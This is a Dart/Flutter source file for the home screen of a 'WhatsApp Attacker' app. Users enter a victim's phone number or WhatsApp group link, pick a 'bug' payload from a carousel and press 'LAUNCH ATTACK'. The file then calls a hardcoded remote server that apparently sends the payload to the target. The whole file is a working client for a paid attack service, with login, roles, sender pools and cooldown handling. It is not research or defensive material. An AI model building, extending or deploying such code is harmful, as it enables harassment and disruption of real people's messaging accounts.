// home_page.dart - FIXED VERSION 100% READY TO USE

import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _pulseController;
  String selectedBugId = "";

  String _selectedBugMode = "number";

  bool _isSending = false;
  String? _responseMessage;
  String _selectedSender = "private";

  // Sender stats
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;
  Timer? _statsTimer;

  // CAROUSEL
  late PageController _pageController;
  int _currentPayloadIndex = 0;

  // ─── Cyberpunk Red Theme ───────────────────────────
  final Color primaryBg  = const Color(0xFF050505);
  final Color cardBg     = const Color(0xFF0A0A0A);
  final Color neonRed    = const Color(0xFFFF003C);
  final Color darkRed    = const Color(0xFF2D0010);
  final Color borderDim  = const Color(0x33FF003C);
  final Color errorRed   = const Color(0xFFE53935);
  final Color textWhite  = Colors.white;
  final Color textGrey   = const Color(0xFF660000);

  @override
  void initState() {
    super.initState();

    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _pageController = PageController(initialPage: 0, viewportFraction: 0.4);
    
    // FIX: Set selectedBugId dengan benar berdasarkan mode
    final filteredBugs = _getFilteredBugs();
    if (filteredBugs.isNotEmpty) {
      selectedBugId = filteredBugs[0]['bug_id']?.toString() ?? '';
    }

    _fetchSenderStats();
    _statsTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
      _fetchSenderStats();
    });

    _pageController.addListener(() {
      if (_pageController.page != null) {
        final newIndex = _pageController.page!.round();
        final filteredBugs = _getFilteredBugs();
        if (newIndex != _currentPayloadIndex && newIndex >= 0 && newIndex < filteredBugs.length) {
          setState(() {
            _currentPayloadIndex = newIndex;
            // FIX: Update selectedBugId saat carousel bergeser
            selectedBugId = filteredBugs[_currentPayloadIndex]['bug_id']?.toString() ?? '';
          });
        }
      }
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    targetController.dispose();
    _statsTimer?.cancel();
    _pageController.dispose();
    super.dispose();
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    final List<Map<String, dynamic>> bugs = [];
    for (var bug in widget.listBug) {
      if (_selectedBugMode == "group") {
        if (bug['bug_gb'] != null && bug['bug_gb'].toString().isNotEmpty) {
          bugs.add(bug);
        }
      } else {
        if (bug['bug_name'] != null && bug['bug_name'].toString().isNotEmpty) {
          bugs.add(bug);
        }
      }
    }
    return bugs;
  }

  Future<void> _fetchSenderStats() async {
    try {
      final response = await http.get(
        Uri.parse("http://senzlinodepriv.senzhosting.my.id:10791/getSenderStats?key=${widget.sessionKey}")
      );
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      print("Error fetching sender stats: $e");
    }
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) =>
      input.contains('chat.whatsapp.com') && input.contains('https://');

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    // FIX: Validasi target sesuai mode
    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert(
            "❌ Invalid Number",
            "Gunakan nomor internasional (misal: +62xxx, +1xxx, +44xxx), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert(
            "❌ Invalid Link",
            "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final res = await http.get(Uri.parse(
          "http://senzlinodepriv.senzhosting.my.id:10791/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&sender=$_selectedSender"));
      
      print("🔍 Sending bug: key=$key, target=$rawInput, bug=$selectedBugId, sender=$_selectedSender");
      
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu ${data['wait'] ?? 'beberapa'} detik.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage = "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug!");
        targetController.clear();
      }
    } catch (e) {
      print("❌ Error sending bug: $e");
      setState(() => _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: neonRed.withOpacity(0.4)),
        ),
        title: Text(title,
            style: TextStyle(
              color: neonRed,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
            )),
        content: Text(msg,
            style: const TextStyle(
                color: Colors.grey, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK",
                style: TextStyle(
                    color: neonRed, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  Widget _buildTopHeaderBox() {
  return Container(
    margin: const EdgeInsets.only(bottom: 20),
    padding: const EdgeInsets.all(0),
    decoration: BoxDecoration(
      color: Colors.transparent,
      borderRadius: BorderRadius.circular(20),
    ),
    child: Column(
      children: [
        // Header utama dengan efek glassmorphism
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                cardBg,
                const Color(0xFF0D0D0D),
              ],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(
              color: neonRed.withOpacity(0.3),
              width: 1,
            ),
            boxShadow: [
              BoxShadow(
                color: neonRed.withOpacity(0.08),
                blurRadius: 30,
                spreadRadius: 0,
                offset: const Offset(0, 5),
              ),
            ],
          ),
          child: Column(
            children: [
              // Logo dan judul section
              Row(
                children: [
                  // Animated logo container
                  Container(
                    width: 44,
                    height: 44,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          neonRed.withOpacity(0.2),
                          neonRed.withOpacity(0.05),
                        ],
                      ),
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(
                        color: neonRed.withOpacity(0.4),
                        width: 1.2,
                      ),
                    ),
                    child: Stack(
                      alignment: Alignment.center,
                      children: [
                        // Efek glow
                        Container(
                          width: 30,
                          height: 30,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: neonRed.withOpacity(0.15),
                            boxShadow: [
                              BoxShadow(
                                color: neonRed.withOpacity(0.4),
                                blurRadius: 12,
                                spreadRadius: 2,
                              ),
                            ],
                          ),
                        ),
                        // Icon bug
                        const Icon(
                          Icons.bug_report_rounded,
                          color: Colors.white,
                          size: 22,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          "ATTACK SYSTEM",
                          style: TextStyle(
                            color: neonRed.withOpacity(0.6),
                            fontFamily: 'ShareTechMono',
                            fontSize: 9,
                            letterSpacing: 3,
                            fontWeight: FontWeight.w500,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          "WHATSAPP ATTACKER",
                          style: TextStyle(
                            color: textWhite,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w800,
                            fontSize: 16,
                            letterSpacing: 2,
                            height: 1.2,
                          ),
                        ),
                      ],
                    ),
                  ),
                  // Status indicator - DIUBAH KE HIJAU
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                    decoration: BoxDecoration(
                      color: const Color(0xFF00FF41).withOpacity(0.1),
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(
                        color: const Color(0xFF00FF41).withOpacity(0.3),
                        width: 0.8,
                      ),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Container(
                          width: 6,
                          height: 6,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: const Color(0xFF00FF41),
                            boxShadow: [
                              BoxShadow(
                                color: const Color(0xFF00FF41),
                                blurRadius: 6,
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(width: 6),
                        Text(
                          "ACTIVE",
                          style: TextStyle(
                            color: const Color(0xFF00FF41).withOpacity(0.9),
                            fontFamily: 'ShareTechMono',
                            fontSize: 9,
                            fontWeight: FontWeight.w600,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
              
              const SizedBox(height: 24),
              
              // Separator line dengan efek
              Container(
                height: 1,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.centerLeft,
                    end: Alignment.centerRight,
                    colors: [
                      Colors.transparent,
                      neonRed.withOpacity(0.3),
                      neonRed.withOpacity(0.6),
                      neonRed.withOpacity(0.3),
                      Colors.transparent,
                    ],
                  ),
                ),
              ),
              
              const SizedBox(height: 20),
              
              // User info cards dengan desain modern
              Row(
                children: [
                  _buildModernInfoCard("USERNAME", widget.username, Icons.person_outline_rounded),
                  const SizedBox(width: 12),
                  _buildModernInfoCard("ROLE", widget.role.toUpperCase(), Icons.shield_outlined),
                  const SizedBox(width: 12),
                  _buildModernInfoCard("EXPIRED", widget.expiredDate, Icons.calendar_today_rounded),
                ],
              ),
            ],
          ),
        ),
      ],
    ),
  );
}

Widget _buildModernInfoCard(String label, String value, IconData icon) {
  return Expanded(
    child: Container(
      padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.02),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: neonRed.withOpacity(0.15),
          width: 0.8,
        ),
      ),
      child: Column(
        children: [
          // Icon container
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: neonRed.withOpacity(0.08),
              borderRadius: BorderRadius.circular(8),
            ),
            child: Icon(
              icon,
              color: neonRed.withOpacity(0.7),
              size: 14,
            ),
          ),
          const SizedBox(height: 10),
          // Label
          Text(
            label,
            style: TextStyle(
              color: textWhite.withOpacity(0.35),
              fontFamily: 'ShareTechMono',
              fontSize: 8,
              letterSpacing: 1.2,
              fontWeight: FontWeight.w500,
            ),
          ),
          const SizedBox(height: 6),
          // Value
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: neonRed.withOpacity(0.05),
              borderRadius: BorderRadius.circular(6),
              border: Border.all(
                color: neonRed.withOpacity(0.1),
                width: 0.5,
              ),
            ),
            child: Text(
              value,
              style: TextStyle(
                color: neonRed.withOpacity(0.9),
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.w700,
                fontSize: 11,
                letterSpacing: 0.5,
              ),
              overflow: TextOverflow.ellipsis,
              maxLines: 1,
            ),
          ),
        ],
      ),
    ),
  );
}

  Widget _buildSelectPayloadBox() {
    final filteredBugs = _getFilteredBugs();
    final totalCount = filteredBugs.length;
    final currentDisplay = totalCount > 0 ? (_currentPayloadIndex + 1).toString().padLeft(2, '0') : '00';
    final totalDisplay = totalCount.toString().padLeft(2, '0');
    
    return Row(
      children: [
        Container(
          width: 4,
          height: 20,
          decoration: BoxDecoration(
            color: neonRed,
            borderRadius: BorderRadius.circular(2),
            boxShadow: [BoxShadow(color: neonRed.withOpacity(0.6), blurRadius: 6)],
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: Text(
            "SELECT PAYLOAD",
            style: TextStyle(
              color: neonRed,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.w800,
              fontSize: 11,
              letterSpacing: 2,
              shadows: [Shadow(color: neonRed.withOpacity(0.4), blurRadius: 8)],
            ),
          ),
        ),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
          decoration: BoxDecoration(
            color: primaryBg,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: borderDim),
          ),
          child: Row(
            children: [
              AnimatedBuilder(
                animation: _pulseController,
                builder: (context, _) {
                  return Icon(
                    Icons.brightness_1,
                    size: 6,
                    color: neonRed.withOpacity(0.5 + _pulseController.value * 0.3),
                  );
                },
              ),
              const SizedBox(width: 6),
              Text(
                "$currentDisplay / $totalDisplay",
                style: TextStyle(
                  color: neonRed,
                  fontFamily: 'ShareTechMono',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildPayloadCarousel() {
    final filteredBugs = _getFilteredBugs();
    
    if (filteredBugs.isEmpty) {
      return Container(
        height: 180,
        decoration: BoxDecoration(
          color: cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: borderDim),
        ),
        child: Center(
          child: Text(
            "NO PAYLOAD AVAILABLE",
            style: TextStyle(color: neonRed.withOpacity(0.5), fontFamily: 'Orbitron'),
          ),
        ),
      );
    }
    
    return SizedBox(
      height: MediaQuery.of(context).size.width * 0.38, 
      child: PageView.builder(
        controller: _pageController,
        itemCount: filteredBugs.length,
        itemBuilder: (context, index) {
          final isActive = index == _currentPayloadIndex;
          final bug = filteredBugs[index];
          final displayName = _selectedBugMode == "group"
              ? bug['bug_gb']?.toString() ?? "UNKNOWN"
              : bug['bug_name']?.toString() ?? "UNKNOWN";
          final indexDisplay = (index + 1).toString().padLeft(2, '0');
          
          return Padding(
            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 8), 
            child: AnimatedScale(
              scale: isActive ? 1.0 : 0.9,
              duration: const Duration(milliseconds: 300),
              curve: Curves.easeOutCubic,
              child: GestureDetector(
                onTap: () {
                  setState(() {
                    _currentPayloadIndex = index;
                    // FIX: Update selectedBugId saat card diklik
                    selectedBugId = filteredBugs[index]['bug_id']?.toString() ?? '';
                    _pageController.animateToPage(
                      index,
                      duration: const Duration(milliseconds: 300),
                      curve: Curves.easeOutCubic,
                    );
                  });
                },
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  decoration: BoxDecoration(
                    color: isActive ? darkRed : cardBg,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: isActive ? neonRed : borderDim,
                      width: isActive ? 2 : 1,
                    ),
                    boxShadow: isActive ? [
                      BoxShadow(color: neonRed.withOpacity(0.6), blurRadius: 25, spreadRadius: 1),
                      BoxShadow(color: neonRed.withOpacity(0.3), blurRadius: 50, spreadRadius: -10),
                    ] : [],
                  ),
                  child: Stack(
                    children: [
                      Positioned(
                        top: 10,
                        left: 12,
                        child: Text(
                          indexDisplay,
                          style: TextStyle(
                            color: isActive ? neonRed : textWhite.withOpacity(0.15),
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            fontSize: 15,
                          ),
                        ),
                      ),
                      Center(
                        child: Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 24),
                          child: Text(
                            displayName.toUpperCase(),
                            textAlign: TextAlign.center,
                            maxLines: 3,
                            overflow: TextOverflow.ellipsis,
                            style: TextStyle(
                              color: isActive ? textWhite : textWhite.withOpacity(0.35),
                              fontFamily: 'Orbitron',
                              fontWeight: FontWeight.bold,
                              fontSize: isActive ? 11 : 10,
                              letterSpacing: 0.5,
                              height: 1.3,
                            ),
                          ),
                        ),
                      ),
                      Positioned(
                        bottom: 12,
                        left: 0,
                        right: 0,
                        child: Center(
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                            decoration: BoxDecoration(
                              color: isActive ? neonRed.withOpacity(0.15) : Colors.transparent,
                              borderRadius: BorderRadius.circular(20),
                              border: Border.all(
                                color: isActive ? neonRed : textWhite.withOpacity(0.1),
                                width: 1,
                              ),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(
                                  isActive ? Icons.radio_button_checked : Icons.radio_button_unchecked,
                                  size: 8,
                                  color: isActive ? neonRed : textWhite.withOpacity(0.2),
                                ),
                                const SizedBox(width: 5),
                                Text(
                                  isActive ? "ARMED" : "STANDBY",
                                  style: TextStyle(
                                    color: isActive ? neonRed : textWhite.withOpacity(0.2),
                                    fontFamily: 'ShareTechMono',
                                    fontWeight: FontWeight.bold,
                                    fontSize: 9,
                                    letterSpacing: 1.5,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  // ============ SELECTED PAYLOAD INDICATOR ============
  Widget _buildSelectedPayloadIndicator() {
    final filteredBugs = _getFilteredBugs();
    if (filteredBugs.isEmpty) return const SizedBox.shrink();
    
    final currentBug = filteredBugs[_currentPayloadIndex];
    final displayName = _selectedBugMode == "group"
        ? currentBug['bug_gb']?.toString() ?? "UNKNOWN"
        : currentBug['bug_name']?.toString() ?? "UNKNOWN";
    final bugId = currentBug['bug_id']?.toString() ?? "UNKNOWN";
    
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 12),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: cardBg.withOpacity(0.8),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(
          color: neonRed.withOpacity(0.25),
          width: 0.8,
        ),
        boxShadow: [
          BoxShadow(
            color: neonRed.withOpacity(0.03),
            blurRadius: 12,
            spreadRadius: 0,
          ),
        ],
      ),
      child: Row(
        children: [
          // Left section - Icon
          Container(
            width: 42,
            height: 42,
            decoration: BoxDecoration(
              color: neonRed.withOpacity(0.08),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: neonRed.withOpacity(0.15),
                width: 0.5,
              ),
            ),
            child: Icon(
              Icons.gps_fixed_rounded,
              color: neonRed.withOpacity(0.8),
              size: 20,
            ),
          ),
          const SizedBox(width: 14),
          
          // Middle section - Payload info
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisSize: MainAxisSize.min,
              children: [
                Text(
                  displayName.toUpperCase(),
                  style: TextStyle(
                    color: textWhite,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.w600,
                    fontSize: 13,
                    letterSpacing: 0.8,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    Container(
                      width: 3,
                      height: 3,
                      decoration: BoxDecoration(
                        color: neonRed.withOpacity(0.5),
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      bugId,
                      style: TextStyle(
                        color: Colors.grey[500],
                        fontFamily: 'ShareTechMono',
                        fontSize: 9,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          
          const SizedBox(width: 12),
          
          // Right section - ARMED status
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
            decoration: BoxDecoration(
              color: neonRed.withOpacity(0.1),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: neonRed.withOpacity(0.2),
                width: 0.5,
              ),
            ),
            child: Text(
              "ARMED",
              style: TextStyle(
                color: neonRed.withOpacity(0.8),
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.w700,
                fontSize: 10,
                letterSpacing: 1.2,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildModeSelector() {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderDim, width: 1.5),
      ),
      child: Row(
        children: [
          Expanded(
              child: _buildModeButton(
                  "number", Icons.phone_android_rounded, "ATTACK NOMOR")),
          const SizedBox(width: 8),
          Expanded(child: _buildModeButton("group", Icons.group_add, "ATTACK GROUP")),
        ],
      ),
    );
  }

  Widget _buildModeButton(String mode, IconData icon, String label) {
    final bool isSelected = _selectedBugMode == mode;
    return GestureDetector(
      onTap: () => setState(() {
        _selectedBugMode = mode;
        targetController.clear();
        _currentPayloadIndex = 0;
        final filtered = _getFilteredBugs();
        if (filtered.isNotEmpty) {
          // FIX: Update selectedBugId saat mode berubah
          selectedBugId = filtered[0]['bug_id']?.toString() ?? '';
        }
        _pageController.jumpToPage(0);
      }),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 220),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: isSelected ? darkRed : cardBg,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: isSelected ? neonRed : borderDim,
            width: isSelected ? 2 : 1.5,
          ),
          boxShadow: isSelected
              ? [BoxShadow(color: neonRed.withOpacity(0.15), blurRadius: 14, spreadRadius: 1)]
              : [],
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: isSelected ? neonRed : textGrey, size: 18),
            const SizedBox(width: 8),
            Text(
              label,
              style: TextStyle(
                color: isSelected ? neonRed : textGrey,
                fontWeight: FontWeight.bold,
                fontSize: 12,
                fontFamily: 'Orbitron',
                letterSpacing: 0.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        _buildModeSelector(),
        const SizedBox(height: 20),

        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 8),
          child: Text(
            _selectedBugMode == "number" ? "NOMOR TARGET" : "LINK GROUP TARGET",
            style: TextStyle(
              color: textWhite,
              fontWeight: FontWeight.w700,
              fontSize: 11,
              fontFamily: 'Orbitron',
              letterSpacing: 2,
            ),
          ),
        ),

        Container(
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: borderDim, width: 1.5),
            boxShadow: [
              BoxShadow(color: Colors.black.withOpacity(0.4), blurRadius: 8, offset: const Offset(0, 4)),
            ],
          ),
          child: TextField(
            controller: targetController,
            style: TextStyle(color: textWhite, fontSize: 13, fontFamily: 'ShareTechMono'),
            cursorColor: neonRed,
            keyboardType: _selectedBugMode == "number"
                ? TextInputType.phone
                : TextInputType.url,
            decoration: InputDecoration(
              hintText: _selectedBugMode == "number"
                  ? "Contoh: +62xxxxxxxxxx"
                  : "Contoh: https://chat.whatsapp.com/...",
              hintStyle: TextStyle(color: textGrey.withOpacity(0.55), fontFamily: 'ShareTechMono', fontSize: 12),
              filled: true,
              fillColor: Colors.transparent,
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(16),
                borderSide: BorderSide.none,
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(16),
                borderSide: BorderSide.none,
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(16),
                borderSide: BorderSide(color: neonRed.withOpacity(0.5), width: 1.5),
              ),
              prefixIcon: Icon(
                _selectedBugMode == "number"
                    ? Icons.phone_android_rounded
                    : Icons.link,
                color: neonRed,
                size: 18,
              ),
              contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 18),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSenderSelector() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 8),
          child: Text(
            "SELECT SENDER TYPE",
            style: TextStyle(
              color: textWhite,
              fontWeight: FontWeight.w700,
              fontSize: 11,
              fontFamily: 'Orbitron',
              letterSpacing: 2,
            ),
          ),
        ),
        Row(
          children: [
            Expanded(child: _buildSenderButton("private", "SENDER PRIVATE")),
            const SizedBox(width: 14),
            Expanded(child: _buildSenderButton("global", "SENDER GLOBAL")),
          ],
        ),
      ],
    );
  }

  Widget _buildSenderButton(String sender, String label) {
    final bool isSelected = _selectedSender == sender;
    int activeCount = sender == "private" ? _privateSenderCount : _globalSenderCount;
    
    return GestureDetector(
      onTap: () => setState(() => _selectedSender = sender),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 220),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: isSelected ? darkRed : cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: isSelected ? neonRed : borderDim,
            width: isSelected ? 2 : 1.5,
          ),
          boxShadow: isSelected
              ? [BoxShadow(color: neonRed.withOpacity(0.18), blurRadius: 16, spreadRadius: 1)]
              : [],
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text(
              label,
              style: TextStyle(
                color: isSelected ? neonRed : textGrey,
                fontWeight: FontWeight.bold,
                fontSize: 12,
                fontFamily: 'Orbitron',
                letterSpacing: 0.8,
              ),
            ),
            const SizedBox(height: 4),
            AnimatedBuilder(
              animation: _pulseController,
              builder: (context, _) {
                return Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: isSelected
                            ? neonRed.withOpacity(0.6 + _pulseController.value * 0.4)
                            : textGrey.withOpacity(0.4),
                        boxShadow: isSelected
                            ? [BoxShadow(color: neonRed.withOpacity(0.5), blurRadius: 6)]
                            : [],
                      ),
                    ),
                    const SizedBox(width: 5),
                    Text(
                      "$activeCount Active",
                      style: TextStyle(
                        color: isSelected ? neonRed.withOpacity(0.7) : textGrey.withOpacity(0.5),
                        fontSize: 10,
                        fontFamily: 'ShareTechMono',
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                );
              },
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, _) {
        return Container(
          height: 56,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            color: cardBg,
            border: Border.all(
              color: errorRed.withOpacity(0.6 + _pulseController.value * 0.4),
              width: 1.8,
            ),
            boxShadow: [
              BoxShadow(
                color: errorRed.withOpacity(0.10 + _pulseController.value * 0.15),
                blurRadius: 20,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Material(
            color: Colors.transparent,
            child: InkWell(
              borderRadius: BorderRadius.circular(16),
              onTap: _isSending ? null : _sendBug,
              child: Center(
                child: _isSending
                    ? SizedBox(
                        height: 22,
                        width: 22,
                        child: CircularProgressIndicator(color: errorRed, strokeWidth: 2.5),
                      )
                    : Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.rocket_launch_rounded, color: errorRed, size: 20),
                          const SizedBox(width: 12),
                          Text(
                            "LAUNCH ATTACK",
                            style: TextStyle(
                              color: textWhite,
                              fontWeight: FontWeight.w800,
                              fontSize: 14,
                              letterSpacing: 3,
                              fontFamily: 'Orbitron',
                            ),
                          ),
                        ],
                      ),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();

    Color bgColor, borderColor, textColor;
    IconData icon;

    if (_responseMessage!.startsWith('✅')) {
      bgColor = Colors.green.withOpacity(0.1);
      borderColor = Colors.greenAccent;
      textColor = Colors.greenAccent;
      icon = Icons.check_circle_outline_rounded;
    } else if (_responseMessage!.startsWith('❌')) {
      bgColor = errorRed.withOpacity(0.1);
      borderColor = errorRed;
      textColor = errorRed;
      icon = Icons.error_outline_rounded;
    } else {
      bgColor = neonRed.withOpacity(0.07);
      borderColor = neonRed;
      textColor = neonRed;
      icon = Icons.info_outline_rounded;
    }

    return Padding(
      padding: const EdgeInsets.only(top: 16),
      child: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: borderColor.withOpacity(0.4), width: 1),
        ),
        child: Row(
          children: [
            Icon(icon, color: textColor, size: 20),
            const SizedBox(width: 10),
            Expanded(
              child: Text(
                _responseMessage!,
                style: TextStyle(
                  color: textColor,
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryBg,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              _buildTopHeaderBox(),
              _buildInputPanel(),
              const SizedBox(height: 10),
              _buildSelectPayloadBox(),
              _buildPayloadCarousel(),
              _buildSelectedPayloadIndicator(),
              const SizedBox(height: 16),
              _buildSenderSelector(),
              const SizedBox(height: 16),
              _buildSendButton(),
              _buildResponseMessage(),
            ],
          ),
        ),
      ),
    );
  }
}